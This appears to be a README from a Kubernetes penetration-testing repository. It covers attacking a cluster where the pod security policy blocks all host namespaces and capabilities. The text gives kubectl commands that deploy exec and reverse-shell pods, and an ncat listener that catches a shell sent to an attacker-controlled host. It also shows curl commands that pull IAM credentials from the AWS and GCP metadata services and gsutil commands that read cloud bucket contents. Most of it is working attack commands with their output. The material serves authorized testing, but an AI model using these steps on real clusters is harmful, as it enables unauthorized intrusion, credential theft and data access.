# Bad Pod #8: Nothing allowed

The pod security policy or admission controller has blocked access to all of the host's namespaces and restricted all capabilities. **Do not despair**, especially if the target cluster is running in a cloud environment. 

## Table of Contents
- [Bad Pod #8: Nothing allowed](#bad-pod-8-nothing-allowed)
  - [Table of Contents](#table-of-contents)
- [Pod creation & access](#pod-creation--access)
  - [Exec pods](#exec-pods)
  - [Reverse shell pods](#reverse-shell-pods)
- [Post exploitation](#post-exploitation)
  - [Cloud metadata](#cloud-metadata)
    - [AWS](#aws)
    - [GCP](#gcp)
  - [Overly permissive service account](#overly-permissive-service-account)
  - [Anonymous-auth](#anonymous-auth)
  - [Exploits](#exploits)
  - [Traditional vulnerability hunting](#traditional-vulnerability-hunting)
- [Reference(s):](#references)

# Pod creation & access

## Exec pods
Create one or more of these resource types and exec into the pod

**Pod**  
```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/pod/nothing-allowed-exec-pod.yaml
kubectl exec -it nothing-allowed-exec-pod -- bash
```
**Job, CronJob, Deployment, StatefulSet, ReplicaSet, ReplicationController, DaemonSet**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 

```bash
kubectl apply -f https://raw.githubusercontent.com/BishopFox/badPods/main/manifests/nothing-allowed/[RESOURCE_TYPE]/nothing-allowed-exec-[RESOURCE_TYPE].yaml 
kubectl get pods | grep nothing-allowed-exec-[RESOURCE_TYPE]      
kubectl exec -it nothing-allowed-exec-[RESOURCE_TYPE]-[ID] -- bash
```

*Keep in mind that if pod security policy blocks the pod, the resource type will still get created. The admission controller only blocks the pods that are created by the resource type.* 

To troubleshoot a case where you don't see pods, use `kubectl describe`

```
kubectl describe nothing-allowed-exec-[RESOURCE_TYPE]
```

## Reverse shell pods
Create one or more of these resources and catch the reverse shell

**Step 1: Set up listener**
```bash
ncat --ssl -vlp 3116
```

**Step 2: Create pod from local manifest without modifying it by using env variables and envsubst**

* Replace [RESOURCE_TYPE] with deployment, statefulset, job, etc. 
* Replace the HOST and PORT values to point the reverse shell to your listener
* 
```bash
HOST="10.0.0.1" PORT="3116" envsubst < ./manifests/nothing-allowed/[RESOURCE_TYPE]/nothing-allowed-revshell-[RESOURCE_TYPE].yaml | kubectl apply -f -
```

**Step 3: Catch the shell**
```bash
$ ncat --ssl -vlp 3116
Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: Listening on :::3116
Ncat: Listening on 0.0.0.0:3116
Connection received on 10.0.0.162 42035
```

# Post exploitation

## Cloud metadata
If cloud hosted, try to access the cloud metadata service. You might get access to the IAM credentials associated with the node, or even just a cloud IAM credential created specifically for that pod. In either case, this can be your path to escalate within the cluster, within the cloud environment, or both.
### AWS
```bash
curl http://169.254.169.254/latest/user-data #Look for credentials or bucket names
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ #List's role name
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/[ROLE NAME] # Get creds
```
### GCP
Test to see if you have access to the metadata service:
```
curl -H "Metadata-Flavor: Google" 'http://metadata/computeMetadata/v1/instance/'
126817330210-compute@developer.gserviceaccount.com/
default/
```

**See permissions assigned to default service account**
```
curl -H 'Metadata-Flavor:Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/
https://www.googleapis.com/auth/devstorage.read_only
https://www.googleapis.com/auth/logging.write
https://www.googleapis.com/auth/monitoring
https://www.googleapis.com/auth/servicecontrol
https://www.googleapis.com/auth/service.management.readonly
https://www.googleapis.com/auth/trace.append
```

If you can query the metadata service, you can proceed with curl, but I suggest deploying another pod with the `gcr.io/google.com/cloudsdktool/cloud-sdk:latest` image. This allows you to use `gcloud` and `gsutil` as the node.

Something like this: 

```yaml
apiVersion: v1
kind: Pod
metadata:
  name: nothing-allowed-gcloud-pod
  labels:
    app: pentest
spec:
  containers:
  - name: nothing-allowed-gcloud-pod
    image: gcr.io/google.com/cloudsdktool/cloud-sdk:latest
    command: [ "/bin/sh", "-c", "--" ]
    args: [ "while true; do sleep 30; done;" ]
```

**Example: Find buckets, list objects, and read file contents**
```
root@nothing-allowed-gcloud-pod:/# gsutil ls
gs://playground-test123/

root@nothing-allowed-gcloud-pod:/# gsutil ls gs://playground-test123
gs://playground-test123/luggage_combination.txt

root@nothing-allowed-gcloud-pod:/# gsutil cat gs://playground-test123/luggage_combination.txt
12345
```

An awesome GCP privesc reference: https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/

### Azure


## Overly permissive service account
If the default service account is mounted to your pod and is overly permissive, you can use that token to further escalate your privs within the cluster.

## Anonymous-auth
If either [the apiserver or the kubelets have anonymous-auth set to true](https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/), and there are no network policy controls preventing it, you can interact with them directly without authentication. 

## Exploits
Is the kubernetes version vulnerable to an exploit, i.e. [CVE-2020-8558](https://github.com/tabbysable/POC-2020-8558)
## Traditional vulnerability hunting
Your pod will be able to see a different view of the network services running within the cluster than you likely can see from the machine you used to create the pod. You can hunt for vulnerable services by proxying your traffic through the pod. 

   [This write-up of a CTF challenge](https://keramas.github.io/2020/08/10/Recon-Village-CTF-at-DC28.html) created by Madhu Akula demonstrates a pretty common post exploitation pattern



# Reference(s): 

* https://about.gitlab.com/blog/2020/02/12/plundering-gcp-escalating-privileges-in-google-cloud-platform/
* https://securekubernetes.com/
* https://madhuakula.com/kubernetes-goat/
* https://labs.f-secure.com/blog/attacking-kubernetes-through-kubelet/
* https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/
* https://github.com/tabbysable/POC-2020-8558
